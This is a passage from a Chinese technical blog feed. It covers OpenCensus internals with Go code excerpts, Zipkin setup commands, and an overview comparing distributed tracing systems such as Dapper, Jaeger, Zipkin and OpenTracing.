<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//go.opencensus.io/trace.go</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// StartSpan starts a new child span of the current span in the context. If</span></span><br><span class="line"><span class="comment">// there is no span in the context, creates a new trace and span.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">StartSpan</span><span class="params">(ctx context.Context, name <span class="keyword">string</span>, o ...StartOption)</span> <span class="params">(context.Context, *Span)</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> opts StartOptions</span><br><span class="line">	<span class="keyword">var</span> parent SpanContext</span><br><span class="line">	<span class="keyword">if</span> p := FromContext(ctx); p != <span class="literal">nil</span> &#123;</span><br><span class="line">		parent = p.spanContext</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> _, op := <span class="keyword">range</span> o &#123;</span><br><span class="line">		op(&amp;opts)</span><br><span class="line">	&#125;</span><br><span class="line">	span := startSpanInternal(name, parent != SpanContext&#123;&#125;, parent, <span class="literal">false</span>, opts)</span><br><span class="line"></span><br><span class="line">	ctx, end := startExecutionTracerTask(ctx, name)</span><br><span class="line">	span.executionTracerTaskEnd = end</span><br><span class="line">	<span class="keyword">return</span> NewContext(ctx, span), span</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// FromContext returns the Span stored in a context, or nil if there isn&#x27;t one.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">FromContext</span><span class="params">(ctx context.Context)</span> *<span class="title">Span</span></span> &#123;</span><br><span class="line">	s, _ := ctx.Value(contextKey&#123;&#125;).(*Span)</span><br><span class="line">	<span class="keyword">return</span> s</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="视图"><a href="#视图" class="headerlink" title="视图"></a>视图</h4><ul>
<li>注册-订阅 模式</li>
</ul>
<p>视图注册之后开始收集给定的数据。一旦该视图被订阅，它就向已注册的 Exporter 报送数据。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// source code : go.opencensus.io/view/worker.go</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Register begins collecting data for the given views.</span></span><br><span class="line"><span class="comment">// Once a view is subscribed, it reports data to the registered exporters.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Register</span><span class="params">(views ...*View)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">	<span class="keyword">for</span> _, v := <span class="keyword">range</span> views &#123;</span><br><span class="line">		<span class="keyword">if</span> err := v.canonicalize(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> err</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	req := &amp;registerViewReq&#123;</span><br><span class="line">		views: views,</span><br><span class="line">		err:   <span class="built_in">make</span>(<span class="keyword">chan</span> error),</span><br><span class="line">	&#125;</span><br><span class="line">	defaultWorker.c &lt;- req</span><br><span class="line">	<span class="keyword">return</span> &lt;-req.err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="Exporter"><a href="#Exporter" class="headerlink" title="Exporter"></a>Exporter</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// source: go.opencensus.io/trace/export.go</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// SpanData contains all the information collected by a Span.</span></span><br><span class="line"><span class="keyword">type</span> SpanData <span class="keyword">struct</span> &#123;</span><br><span class="line">	SpanContext</span><br><span class="line">	ParentSpanID SpanID</span><br><span class="line">	SpanKind     <span class="keyword">int</span></span><br><span class="line">	Name         <span class="keyword">string</span></span><br><span class="line">	StartTime    time.Time</span><br><span class="line">	<span class="comment">// The wall clock time of EndTime will be adjusted to always be offset</span></span><br><span class="line">	<span class="comment">// from StartTime by the duration of the span.</span></span><br><span class="line">	EndTime time.Time</span><br><span class="line">	<span class="comment">// The values of Attributes each have type string, bool, or int64.</span></span><br><span class="line">	Attributes    <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">interface</span>&#123;&#125;</span><br><span class="line">	Annotations   []Annotation</span><br><span class="line">	MessageEvents []MessageEvent</span><br><span class="line">	Status</span><br><span class="line">	Links           []Link</span><br><span class="line">	HasRemoteParent <span class="keyword">bool</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="OpenCensu-资讯"><a href="#OpenCensu-资讯" class="headerlink" title="OpenCensu 资讯"></a>OpenCensu 资讯</h2><h4 id="Microsoft-joins-the-OpenCensus-project-June-13-2018"><a href="#Microsoft-joins-the-OpenCensus-project-June-13-2018" class="headerlink" title="Microsoft joins the OpenCensus project | June 13,2018"></a><a href="https://open.microsoft.com/2018/06/13/microsoft-joins-the-opencensus-project/">Microsoft joins the OpenCensus project | June 13,2018</a></h4><blockquote>
<p>We are happy to announce that Microsoft is joining the open source OpenCensus project, originally initiated and shepherded by Google, and we are excited to help it achieve the goal of “a single distribution of libraries for metrics and distributed tracing with minimal overhead.”</p>
</blockquote>
<p>微软宣布加入开源项目 OpenCensus —— 最初是由 Google 发起和主导，旨在建立一个低开销的分布式追踪和度量库。</p>
<p>现代基于云的应用程序通常是分布式的, 需要专门的监测和追踪技术来跟踪定位故障和性能问题。Azure 应用程序内置 <a href="https://docs.microsoft.com/zh-cn/azure/application-insights/app-insights-app-map">Application Map，应用程序映射|会审分布式应用程序</a> 和 <a href="https://docs.microsoft.com/zh-cn/azure/application-insights/app-insights-transaction-diagnostics">End-to-End Transaction Diagnostics，端到端跨组件事务诊断功能</a>。但是目前的监测工具体系中缺乏一个标准化的平台来实现度量和分布式跟踪, 这些数据需要支持跨编程语言和技术栈。微软宣称将利用自己的经验和知识与 OpenCensus 社区合作, 在应用程序度量和分布式跟踪领域创建一个开放和可扩展的标准平台, 从而使所有客户受益。</p>
<blockquote>
<p>Our goal is to leverage our experience and knowledge and combine it with that of OpenCensus community to create an open and extensible, standard platform for application metrics and distributed traces that will benefit all customers.  </p>
</blockquote>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/azure/application-insights/app-insights-app-map">Application Map，应用程序映射|会审分布式应用程序</a></li>
</ul>
<p>应用程序映射可帮助发现性能瓶颈或热点失败的所有组件的分布式应用程序。在地图上的每个节点表示应用程序组件或其依赖项;并且有运行状况 KPI 和警报状态。可从任何组件单击以获得更详细的诊断，如 Application Insights 事件。 如果应用使用了 Azure 服务，还可以单击获得 Azure 诊断，如 SQL 数据库顾问建议。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/MS-ApplicationMap.png" alt=""></p>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/azure/application-insights/app-insights-transaction-diagnostics">End-to-End Transaction Diagnostics，端到端跨组件事务诊断</a></li>
</ul>
<p>事务诊断功能将所有受 Application Insights 监视的组件中的服务器端遥测关联到一个单独的视图。Application Insights 可检测基础关系，并可用于诊断导致事务缓慢或失败的应用程序组件、依赖项或异常。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/MS-PartscrossComponent.png" alt=""></p>
<h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h2><ul>
<li><a href="https://github.com/orgs/census-instrumentation/people">OpenCensus People</a></li>
<li><a href="https://zipkin.io/pages/quickstart.html">OpenZipkin QuickStart</a></li>
</ul>
<h4 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ docker image pull openzipkin/zipkin</span><br><span class="line">$ docker run -d -p 9411:9411 openzipkin/zipkin</span><br><span class="line">$ docker container ls</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                              NAMES</span><br><span class="line">65d6aa99ea41        openzipkin/zipkin   <span class="string">&quot;/bin/bash -c &#x27;test …&quot;</span>   57 seconds ago      Up 56 seconds       9410/tcp, 0.0.0.0:9411-&gt;9411/tcp   zealous_shockley</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># get the latest source</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/openzipkin/zipkin</span><br><span class="line"><span class="built_in">cd</span> zipkin</span><br><span class="line"><span class="comment"># Build the server and also make its dependencies</span></span><br><span class="line">./mvnw -DskipTests --also-make -pl zipkin-server clean install</span><br><span class="line"><span class="comment"># Run the server</span></span><br><span class="line">java -jar ./zipkin-server/target/zipkin-server-*exec.jar</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">********</span><br><span class="line">**        **</span><br><span class="line">*            *</span><br><span class="line">**            **</span><br><span class="line">**            **</span><br><span class="line">**          **</span><br><span class="line">**        **</span><br><span class="line">********</span><br><span class="line">	****</span><br><span class="line">	****</span><br><span class="line">****                          ****</span><br><span class="line">******                           ****                                 ***</span><br><span class="line">****************************************************************************</span><br><span class="line">*******                           ****                                 ***</span><br><span class="line">****                          ****</span><br><span class="line">	 **</span><br><span class="line">	 **</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*****      **     *****     ** **       **     **   **</span><br><span class="line">**       **     **  *     ***         **     **** **</span><br><span class="line">**        **     *****     ****        **     **  ***</span><br><span class="line">******     **     **        **  **      **     **   **</span><br><span class="line"></span><br><span class="line">:: Powered by Spring Boot ::         (v2<span class="number">.0</span><span class="number">.1</span>.RELEASE)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h4 id="分布式追踪系统"><a href="#分布式追踪系统" class="headerlink" title="分布式追踪系统"></a>分布式追踪系统</h4><ul>
<li><a href="https://riboseyim.github.io/2018/04/27/DevOps-OpenCensus">DevOps 漫谈：开源分布式跟踪系统 OpenCensus</a></li>
<li><a href="https://riboseyim.github.io/2018/05/18/DevOps-OpenTracing/">DevOps 漫谈：分布式追踪系统标准体系</a></li>
<li><a href="https://riboseyim.github.io/2017/10/30/Protocol-gRPC/">远程通信协议：从 CORBA 到 gRPC</a></li>
<li><a href="https://riboseyim.github.io/2017/05/24/Log/">应用程序开发中的日志管理(Go语言描述)</a></li>
</ul>
<h4 id="动态追踪技术"><a href="#动态追踪技术" class="headerlink" title="动态追踪技术"></a>动态追踪技术</h4><ul>
<li><a href="https://riboseyim.github.io/2016/11/26/DTrace/">动态追踪技术(一)：DTrace 导论</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5MTY1MjQ3Nw==&amp;mid=2651939588&amp;idx=1&amp;sn=35f71c5f88d1edf23cb2efc812ab8e6c&amp;chksm=bd578c168a20050041c08618281691f0111f61c789097a69095933057618637fc54817815921#rd">动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 </a></li>
<li><a href="https://riboseyim.github.io/2017/04/17/DTrace_FTrace/">动态追踪技术(三)：Tracing Your Kernel Function!</a></li>
<li><a href="https://riboseyim.github.io/2017/06/27/DTrace_bcc/">动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪</a></li>
<li><a href="https://riboseyim.github.io/2018/02/16/DTrace-Linux/">动态追踪技术(五)：Welcome DTrace for Linux</a></li>
</ul>
<h4 id="开源架构技术漫谈"><a href="#开源架构技术漫谈" class="headerlink" title="开源架构技术漫谈"></a>开源架构技术漫谈</h4><ul>
<li><a href="https://riboseyim.github.io/2017/05/23/RestfulAPI/">基于Go语言快速构建一个RESTful API服务</a></li>
<li><a href="https://riboseyim.github.io/2017/06/12/OpenSource-Kafka-Microservice/">基于Kafka构建事件溯源型微服务</a></li>
<li><a href="https://riboseyim.github.io/2017/12/04/Visualization-Graphite/">数据可视化（七）Graphite 体系结构详解</a></li>
<li><a href="https://riboseyim.github.io/2016/08/15/OpenSource-Kafka/">DevOps 资讯 | LinkedIn 开源 Kafka Monitor</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://medium.com/@orijtech/hello-world-for-web-servers-in-go-with-opencensus-29955b3f02c6">“Hello, world!” for web servers in Go with OpenCensus</a></li>
<li><a href="https://opensource.googleblog.com/2018/01/opencensus.html">OpenCensus: A Stats Collection and Distributed Tracing Framework | Wednesday, January 17, 2018 | Google Open Source Blog</a></li>
<li><a href="https://medium.com/@orijtech/opencensus-for-go-grpc-developers-7f3ee1ac3d6d">OpenCensus for Go gRPC developers</a></li>
<li><a href="http://www.infoq.com/cn/news/2017/11/Uber-open-spurce-Jaeger">Uber正式开源其分布式跟踪系统Jaeger | 2017年11月9日</a></li>
<li><a href="http://www.infoq.com/cn/articles/evolving-distributed-tracing-at-uber-engineering">Uber优步分布式追踪技术再度精进</a></li>
<li><a href="https://blog.doit-intl.com/measure-once-export-anywhere-opencensus-in-the-wild-61724f44eb00">Measure Once — Export Anywhere: OpenCensus in the wild</a></li>
<li><a href="https://github.com/census-instrumentation/opencensus-go/blob/master/examples/helloworld/main.go">opencensus-go-examples-helloworld-context</a></li>
<li><a href="https://medium.com/@orijtech/mongodb-driver-instrumented-with-opencensus-in-go-e691370b8184">MongoDB driver instrumented with OpenCensus in Go</a></li>
<li><a href="https://segmentfault.com/a/1190000006744213#articleHeader8">Go语言并发模型：使用 context | oscarzhao 2016年08月29日</a></li>
<li><a href="http://lanlingzi.cn/post/technical/2016/0802_go_context/">理解Go Context机制 | 时间： 2016-08-02</a></li>
<li><a href="http://www.flysnow.org/2017/05/12/go-in-action-go-context.html">Go语言实战笔记（二十）| Go Context | May 12, 2017</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>OpenSource</tag>
        <tag>架构师</tag>
      </tags>
  </entry>
  <entry>
    <title>DevOps 漫谈：分布式追踪系统体系概要</title>
    <url>/2018/05/18/DevOps-OpenTracing/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>Key Words: metrics、logging、tracing</li>
<li>Google Dapper Family : Uber Jaeger、淘宝 EagleEye、微博 Watchman、京东 CallGraph、美团 MTrace</li>
<li>数据可视化 | Exporters</li>
</ul>
<span id="more"></span>
<p>This article is part of an <strong>Distributed Tracing and Monitoring System</strong> tutorial series. Make sure to check out my other articles as well:</p>
<ul>
<li><a href="https://riboseyim.github.io/2018/05/18/DevOps-OpenTracing/">DevOps 漫谈：分布式追踪系统体系概要</a></li>
<li><a href="https://riboseyim.github.io/2018/04/27/DevOps-OpenCensus">DevOps 漫谈：开源分布式跟踪系统 OpenCensus</a></li>
</ul>
<h2 id="绪论"><a href="#绪论" class="headerlink" title="绪论"></a>绪论</h2><p>讨论分布式追踪技术，首先需要明确的是：什么是跟踪 ？</p>
<h4 id="metrics"><a href="#metrics" class="headerlink" title="metrics"></a>metrics</h4><p>度量（metrics）的特征是聚合: 它们是在一段时间内组成单一逻辑标尺、计数器或直方图的跨度。例如：HTTP 请求的数量可以建模为计数器(counter）, 其更新逻辑很简单，只需通过加法聚合; 如果设定一段持续的观察时间，请求数可以被建模成一个直方图。<a href="https://riboseyim.github.io/2016/11/04/OpenSource-Ganglia/">《基于Ganglia实现服务集群性能态势感知》</a> 介绍的就是以记录度量为主的故障监控系统。</p>
<h4 id="logging"><a href="#logging" class="headerlink" title="logging"></a>logging</h4><p>日志（logging）的特征是处理离散事件。按照事件发生的源可以分为 Application Events、System Events、Service Events、DNS Events 等。通常也包含针对原始记录的处理过程，例如：通过 Syslog 将应用程序调试或错误消息发送到 Elasticsearch ; 审计记录通过 Kafka 将数据推送到类似 BigTable 的数据池; 从服务调用中提取特定的请求元数据, 并发送错误跟踪服务（例如 <a href="https://ruby-china.org/topics/22379">NewRelic</a>）。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DTM-MetricsTracingLogging-v2.png" alt=""></p>
<h4 id="tracing"><a href="#tracing" class="headerlink" title="tracing"></a>tracing</h4><p>跟踪（tracing）的特征：跟踪处理的是请求范围内的信息（request-scoped），例如 SQL 语句在数据库的实际执行时间或 HTTP 请求耗时。以 DTrace &amp; SystemTap 为代表的 <a href="https://riboseyim.github.io/2016/11/26/DTrace/">动态追踪技术</a> 基于操作系统内核，不需要埋点就可以提供高级性能分析和调试功能。但是在分布式架构场景中也有一些不足，例如某些功能需要多次调用 RPC 远程服务，这些服务分布在多台不同的 host/vm/docker 中，如果需要测量该功能响应的完整持续时间就有难度。</p>
<h4 id="示例（Use-OpenCensus-with-OpenZipkin）"><a href="#示例（Use-OpenCensus-with-OpenZipkin）" class="headerlink" title="示例（Use OpenCensus with OpenZipkin）"></a>示例（Use OpenCensus with OpenZipkin）</h4><p><a href="https://riboseyim.github.io/2018/05/18/DevOps-OpenTracing/">OpenCensus</a> 作为埋点 API ，导出 tracing data 到 OpenZipkin，由 Zipkin 的 Web UI 提供数据展示和交互能力，可以很清晰地看到函数调用顺序和耗时。从理解系统行为的角度上说，与动态追踪技术中的火焰图（flame graph）有异曲同工之妙。</p>
<ul>
<li>串行调用函数方法，包括网络访问和持久化操作</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/zipkin-%E4%B8%B2%E8%A1%8C.png" alt=""></p>
<ul>
<li>示例（OpenCensus with OpenZipkin）：并行调用函数方法（Go routine）</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/zipkin-%E5%B9%B6%E8%A1%8C.png" alt=""></p>
<h2 id="Google-Dapper-Family"><a href="#Google-Dapper-Family" class="headerlink" title="Google Dapper Family"></a>Google Dapper Family</h2><p>讨论分布式跟踪，就一定会谈到 Dapper —— Google 公司研发并应用于自己生产环境的一款跟踪系统（设计之初参考了一些 Magpie 和 X-Trace 的理念 ）。Dapper 不仅为业内提供了非常有参考价值的实现，同步发表论文的也成为了当前分布式跟踪系统的重要理论基础。Google Dapper 的理念影响了一批分布式跟踪系统的发展，例如 2012 年，Twitter 公司严格按照 Dapper 论文的要求实现了 Zipkin （Scala 编写，集成到 Twitter 公司自己的分布式服务 Finagle ）；Uber 公司基于 Google Dapper 和 Twitter Zipkin 的灵感，开发了开源分布式跟踪系统 Jaeger。</p>
<ul>
<li><a href="https://static.googleusercontent.com/media/research.google.com/zh-CN//archive/papers/dapper-2010-1.pdf">《Dapper, a Large-Scale Distributed Systems Tracing Infrastructure|Google Technical Report dapper-2010-1, April 2010》</a></li>
</ul>
<p>OpenTracing 通过提供平台无关、厂商无关的API，使得开发人员能够方便的添加（或更换）追踪系统的实现。 OpenTracing 提供了用于运营支撑系统的和针对特定平台的辅助程序库。除了 API 之外，一个完整的分布式追踪系统还需要包括数据存储、支持代理转发、用户友好的 WebUI 等特性，例如：Zipkin 专注于 tracing 领域；Prometheus 开始专注于 metrics，同时可能会发展更多的 tracing 功能，但不太可能深入 logging 领域；基于 ELK 之类的日志系统专注于 logging 领域，但也可能集成其他领域的特性。总之，各式各样的分布式追踪系统都是以 tracing 为基础，同时根据自己的需要在其他两个领域各有所侧重而已。</p>
<h4 id="Uber-Jaeger"><a href="#Uber-Jaeger" class="headerlink" title="Uber Jaeger"></a>Uber Jaeger</h4><p><a href="http://www.infoq.com/cn/articles/evolving-distributed-tracing-at-uber-engineering">Uber Jaeger</a> 是 Uber 工程团队开源的分布式追踪系统。自 2016年 起，Jaeger 在 Uber 内部实现大范围应用。Uber 同时开发了一种适用于 RPC 的网络多路复用和框架协议 —— <a href="https://github.com/uber/tchannel">TChannel | Support: Node.js,Python,Go,Java</a>，该协议融入了分布式追踪能力。</p>
<p>TChannel 协议规范在二进制格式中直接定义了追踪字段：“ spanid:8 parentid:8 traceid:8 traceflags:1 ”。</p>
<ul>
<li>jaeger-client：支持多种语言的客户端库，如Go, Java, Python等语言</li>
<li>jaeger-agent：客户端代理负责将追踪数据转发到服务端，这样能方便应用的快速处理，同时减轻服务端的直接压力；另外可以在客户端代理动态调整采样的频率，进行追踪数据采样的控制</li>
<li>jaeger-collector：数据收集器主要进行数据收集和处理，从客户端代理收集数据进行处理后持久化到数据存储中</li>
<li>数据存储：目前支持将收集到的数据持久化到 Cassandra 、 Elasticsearch</li>
<li>jaeger-query：主要根据不同的条件到数据存储中进行搜索，支撑前端页面的展示</li>
<li>jaeger-ui：一个基于 React 的前端 webui</li>
<li>jaeger spark: 是一个基于 Spark 聚合数据管道，用以完成服务依赖分析</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/DTM-Uber-Jaeger.png" alt=""></p>
<h4 id="淘宝-EagleEye（鹰眼）"><a href="#淘宝-EagleEye（鹰眼）" class="headerlink" title="淘宝 EagleEye（鹰眼）"></a>淘宝 EagleEye（鹰眼）</h4><p><a href="http://jm.taobao.org/2014/03/04/3465/">EagleEye（鹰眼）</a> 是Google 的分布式调用跟踪系统 Dapper 在淘宝的实现。主要特点是通过每台应用机器上的 Agent 实时抓取 EagleEye 日志，按照日志类型不分别处理：</p>
<ul>
<li>全量原始日志直接存储到 HDFS ；创建 MapReduce 任务完成调用链合并、分析和统计；</li>
<li>有实时标记的原始日志存储到 HBase ；</li>
<li>业务日志：一部分会被直接处理存储到 HBase，有一部分会作为消息发送出去，由特定的业务系统订阅处理；</li>
<li>调用实时统计，提供分钟级别的实时链路调用视图，辅助故障定位。</li>
</ul>
<h4 id="国内其他衍生系统"><a href="#国内其他衍生系统" class="headerlink" title="国内其他衍生系统"></a>国内其他衍生系统</h4><ul>
<li><p><a href="http://www.infoq.com/cn/articles/weibo-watchman">微博 Watchman</a>：微博平台的链路追踪及服务质量保障系统。watchman-aspect 组件通过异步日志（async-logger）在各个节点上输出日志文件；以流式的方式处理数据，watchman-prism 组件（基于 Scribe），将日志推送到 watchman-stream 组件（基于Storm）, 根据需求进行聚合、统计等计算（针对性能数据），规范化、排序（针对调用链数据），之后写入 HBase 。</p>
</li>
<li><p><a href="http://zhuanlan.51cto.com/art/201701/528304.htm">京东 CallGraph</a>：全局 TraceID 的调用链。核心包（完成埋点逻辑，日志存放在内存磁盘上由 Agent 收集发送到JMQ）、JMQ（日志数据管道）、Storm（对数据日志并行整理和计算）、存储（实时数据存储JimDB/HBase/ES，离线数据存储包括HDFS和Spark）、CallGraph-UI（用户交互界面）、UCC（存放配置信息并同步到各服务器）、管理元数据（存放链路签名与应用映射关系等）。日志格式：固定部分（TraceID、RpcID、开始时间、调用类型、对端IP、调用耗时、调用结果等）、可变部分。</p>
</li>
<li><p><a href="https://tech.meituan.com/mt-mtrace.html">美团 MTrace</a>：美团点评内部的分布式会话跟踪系统。基于全局 TraceID 的调用链，客户端与后端服务之间有一层 Kafka，实现两边工程的解耦。实时数据主要使用 Hbase ，traceID 作为 RowKey；离线数据主要使用 Hive，可以通过 SQL 进行一些结构化数据的定制分析。</p>
</li>
<li><p><a href="https://patents.google.com/patent/WO2017071134A1/zh">CN105224445B | WO2017071134A1 | 分布式追踪系统| 北京汇商融通信息技术有限公司 | 2015-10-28</a></p>
</li>
<li><p><strong>不完全统计</strong></p>
</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th>名称</th>
<th>原理</th>
<th>客户端</th>
<th>依赖分析</th>
<th>存储</th>
<th>可视化</th>
</tr>
</thead>
<tbody>
<tr>
<td>Google Dapper</td>
<td>TraceID</td>
<td>——-</td>
<td>——-</td>
<td>——-</td>
<td>——-</td>
</tr>
<tr>
<td>OpenTracing</td>
<td>TraceID</td>
<td>go,java,python,js,objective-c,c++</td>
<td>——-</td>
<td>——-</td>
<td>——-</td>
</tr>
<tr>
<td>OpenCensus</td>
<td>TraceID</td>
<td>go,java,python,C++,.Net,js,Erlang</td>
<td>——-</td>
<td>——-</td>
<td>no web-ui,Support Exporter</td>
</tr>
<tr>
<td>Uber Jaeger</td>
<td>TraceID</td>
<td>java,go,python <br> Support Agent Proxy</td>
<td>Spark</td>
<td>Cassandra、ES</td>
<td>React Web-ui</td>
</tr>
<tr>
<td>淘宝 EagleEye（鹰眼）</td>
<td>TraceID</td>
<td>yes</td>
<td>MapReduce</td>
<td>HDFS(全量) <br> HBase(实时)</td>
<td>yes</td>
</tr>
<tr>
<td>微博 Watchman</td>
<td>日志</td>
<td>watchman-aspect</td>
<td>Storm</td>
<td>HBase</td>
<td>yes</td>
</tr>
<tr>
<td>京东 CallGraph</td>
<td>TraceID</td>
<td>Agent-&gt;JMQ</td>
<td>Storm</td>
<td>JimDB（实时）<br>ES、Spark（离线）</td>
<td>yes</td>
</tr>
<tr>
<td>美团 MTrace</td>
<td>TraceID</td>
<td>Agent-&gt; Kafka <br> Support Agent  Proxy</td>
<td>Storm</td>
<td>HBase(实时)<br> Hive(离线)</td>
<td>yes</td>
</tr>
</tbody>
</table>
</div>
<h2 id="Exporters-数据可视化"><a href="#Exporters-数据可视化" class="headerlink" title="Exporters | 数据可视化"></a>Exporters | 数据可视化</h2><h3 id="Prometheus-普罗米修斯"><a href="#Prometheus-普罗米修斯" class="headerlink" title="Prometheus|普罗米修斯"></a><a href="https://prometheus.io">Prometheus|普罗米修斯</a></h3><h3 id="Stackdriver"><a href="#Stackdriver" class="headerlink" title="Stackdriver"></a><a href="https://cloud.google.com/stackdriver/">Stackdriver</a></h3><p>适用于 Google Cloud Platform 与 AWS 应用的监控、日志记录和诊断工具</p>
<h3 id="SignalFX"><a href="#SignalFX" class="headerlink" title="SignalFX"></a><a href="https://signalfx.com">SignalFX</a></h3><h3 id="Amazon-AWS-X-Ray"><a href="#Amazon-AWS-X-Ray" class="headerlink" title="Amazon AWS X-Ray"></a>Amazon AWS X-Ray</h3><h3 id="Zipkin"><a href="#Zipkin" class="headerlink" title="Zipkin"></a><a href="https://zipkin.io">Zipkin</a></h3><p>Zipkin 的 Span 模型几乎完全仿造了 Dapper 中的 Span 设计，Zipkin 的 Span 包括基础数据（traceId、spanId、parentId、name、timestamp 和 duration，主要用于表示跟踪树中节点的关联关系）、 Annotation（记录请求特定事件相关信息）、BinaryAnnotation（扩展信息）。</p>
<p>Zipkin 包括四大组件：</p>
<ul>
<li>Zipkin Collector: 处理跟踪数据的守护进程 (validate,store,index)；</li>
<li>Storage: 设计之初支持 Cassandra 存储（Twitter 广泛应用），目前也支持 ElasticSearch 和 MySQL；</li>
<li>Zipkin Query Service: JSON API；</li>
<li>Web UI: 没有内置身份认证。</li>
</ul>
<p><img src="https://zipkin.io/public/img/architecture-1.png" alt="Zipkin Architecture"></p>
<ul>
<li><a href="https://logz.io/blog/zipkin-elk/?utm_source=twitter&amp;utm_medium=social&amp;utm_content=zipkin-elk/&amp;utm_campaign=blog_post">扩展阅读 | Distributed Tracing with Zipkin and ELK</a></li>
</ul>
<p><img src="https://logz.io/wp-content/uploads/2018/05/zipkin_and_elk_-_article.jpg" alt=""></p>
<ul>
<li><a href="https://medium.com/merapar/exposing-zipkin-trace-id-and-span-id-in-logging-for-use-in-kibana-25d1e5b6bfbb">扩展阅读 | Tracing microservices with Zipkin and Kibana</a></li>
</ul>
<p><img src="https://cdn-images-1.medium.com/max/1600/1*edyzJ1zutH1IA2jpITp5Pg.png" alt=""></p>
<h2 id="OpenCensus-vs-OpenTracing"><a href="#OpenCensus-vs-OpenTracing" class="headerlink" title="OpenCensus vs OpenTracing"></a><a href="https://zipkin.io">OpenCensus</a> vs <a href="http://opentracing.io/">OpenTracing</a></h2><div class="table-container">
<table>
<thead>
<tr>
<th>Future</th>
<th>OpenTracing</th>
<th>OpenCensus</th>
<th>Google Dapper</th>
</tr>
</thead>
<tbody>
<tr>
<td>API 支持</td>
<td><a href="https://github.com/opentracing/opentracing-go">Go</a>、 <a href="https://github.com/opentracing/opentracing-python">Python</a>、<a href="https://github.com/opentracing/opentracing-javascript">Javascript</a>、 <a href="https://github.com/opentracing/opentracing-objc">Objective-C</a><br><a href="https://github.com/opentracing/opentracing-java">Java</a>、<a href="https://github.com/opentracing/opentracing-cpp">C++</a> <br> 研发中：<a href="#">PHP</a> 、<a href="#">Ruby </a></td>
<td>Go、Java、C++、.Net，Node.js，Erlang <br> 研发中：<br> Python(STATS In Progress) 、 PHP(STATS Planned) 、 Ruby(STATS Planned)</td>
<td>—</td>
</tr>
<tr>
<td>EXPORTERS</td>
<td>—</td>
<td>SignalFX (Java、C++) <br> Prometheus (Java、C++、Go、Erlang) <br> Jaeger (Java、Go) <br> Stackdriver (Java、C++、Go、Python、ERLANG-Trace Only) <br> Zipkin (Java、C++、Go、Erlang) <br> Instana (Java)</td>
<td>—</td>
</tr>
</tbody>
</table>
</div>
<ul>
<li><p><a href="https://opencensus.io/roadmap.html">OpenCensus ROADMAP</a></p>
</li>
<li><p><a href="https://gianarb.it/blog/what-is-distributed-tracing-opentracing-opencensus">What is distributed tracing. Zoom on opencensus and opentracing</a></p>
</li>
</ul>
<p><blockquote class="twitter-tweet" data-lang="en"><p lang="en" dir="ltr">What&#39;s the difference between opencensus and opentracing?</p>&mdash; #GoldenBlackChild 🌟🏆🏅🥇 (@nevi_me) <a href="https://twitter.com/nevi_me/status/953683034229833728?ref_src=twsrc%5Etfw">January 17, 2018</a></blockquote></p>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>


<h2 id="Sensor-Sensibility-Format"><a href="#Sensor-Sensibility-Format" class="headerlink" title="Sensor Sensibility Format"></a>Sensor Sensibility Format</h2><p>The Sensor Sensibility Format — or SSF for short — is a language agnostic format for transmitting observability data such as trace spans, metrics, events and more. <a href="https://github.com/stripe/veneur/tree/master/ssf">https://github.com/stripe/veneur/tree/master/ssf</a></p>
